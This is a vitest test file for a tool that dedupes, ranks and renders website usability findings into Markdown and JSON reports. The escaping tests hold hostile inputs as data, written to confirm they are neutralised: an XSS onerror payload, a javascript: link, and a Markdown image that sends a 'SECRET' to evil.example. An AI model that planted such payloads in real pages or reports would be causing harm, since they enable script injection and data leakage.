import { mkdtemp, readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildReport, dedupe, rank, renderMarkdown } from "../src/report.js";
import { RunStore, type Finding } from "../src/store.js";

let n = 0;
function finding(over: Partial<Finding>): Finding {
  n += 1;
  return {
    id: `f${n}`,
    persona: "first-timer",
    severity: "minor",
    category: "accessibility",
    title: "Submit button not focusable",
    steps: ["Open /contact", "Press Tab"],
    expected: "Button receives focus",
    actual: "Focus skips it",
    url: "http://localhost:3000/contact",
    at: new Date().toISOString(),
    ...over,
  };
}

const meta = { target: "http://localhost:3000", runId: "run-1", personas: ["first-timer"] };

describe("dedupe", () => {
  it("merges the same problem reported by two personas", () => {
    const merged = dedupe([
      finding({ title: "Submit button not focusable!", severity: "minor" }),
      finding({
        title: "submit  button not focusable",
        persona: "keyboard-only",
        severity: "major",
        url: "http://localhost:3000/contact?x=1#top",
      }),
    ]);
    expect(merged).toHaveLength(1);
    expect(merged[0]?.personas.sort()).toEqual(["first-timer", "keyboard-only"]);
    expect(merged[0]?.occurrences).toBe(2);
    expect(merged[0]?.severity).toBe("major");
  });

  it("keeps different categories or pages apart", () => {
    expect(
      dedupe([
        finding({}),
        finding({ category: "usability" }),
        finding({ url: "http://localhost:3000/blog" }),
      ]),
    ).toHaveLength(3);
  });
});

describe("rank", () => {
  it("orders by severity, then occurrences", () => {
    const ranked = rank(
      dedupe([
        finding({ title: "minor one", severity: "minor" }),
        finding({ title: "critical one", severity: "critical" }),
        finding({ title: "major once", severity: "major" }),
        finding({ title: "major twice", severity: "major" }),
        finding({ title: "major twice", severity: "major", persona: "keyboard-only" }),
      ]),
    );
    expect(ranked.map((f) => f.title)).toEqual([
      "critical one",
      "major twice",
      "major once",
      "minor one",
    ]);
  });
});

describe("renderMarkdown", () => {
  it("escapes hostile text", () => {
    const md = renderMarkdown(
      dedupe([finding({ title: "<img src=x onerror=alert(1)> `code` | pipe\nnewline" })]),
      meta,
    );
    expect(md).toContain("&lt;img");
    expect(md).not.toContain("<img");
    expect(md).toContain("\\`code\\`");
    expect(md).toContain("\\|");
  });

  it("neutralises Markdown links, images and emphasis", () => {
    const md = renderMarkdown(
      dedupe([
        finding({
          title:
            "![x](https://evil.example/t.png?d=SECRET) [click](javascript:alert(1)) *b* _i_ # h ~s~",
        }),
      ]),
      meta,
    );
    expect(md).not.toMatch(/!\[x\]\(/);
    expect(md).not.toMatch(/\[click\]\(/);
    expect(md).toContain("\\!\\[x\\]\\(https://evil.example/t.png?d=SECRET\\)");
    expect(md).toContain("\\*b\\*");
    expect(md).toContain("\\_i\\_");
  });

  it("does not let a backslash undo the escaping", () => {
    const md = renderMarkdown(dedupe([finding({ title: "a\\`b" })]), meta);
    expect(md).toContain("a\\\\\\`b");
  });

  it("states when there are no findings", () => {
    expect(renderMarkdown([], meta)).toMatch(/No findings/);
  });
});

describe("buildReport", () => {
  it("writes report.md and report.json inside the run directory", async () => {
    const store = new RunStore(await mkdtemp(path.join(tmpdir(), "pp-report-")), "run-1");
    await store.appendFinding({
      persona: "first-timer",
      severity: "major",
      category: "functional",
      title: "Broken link",
      steps: ["Click Blog"],
      expected: "Blog opens",
      actual: "404",
      url: "http://localhost:3000/",
      screenshot: "shots/first-timer-blog.png",
    });
    const out = await buildReport(store, meta);
    expect(out.count).toBe(1);
    expect(path.dirname(out.markdownPath)).toBe(store.dir);
    expect(await readFile(out.markdownPath, "utf8")).toContain("Broken link");
    const json = JSON.parse(await readFile(out.jsonPath, "utf8"));
    expect(json.findings).toHaveLength(1);
    expect(json.target).toBe("http://localhost:3000");
  });
});
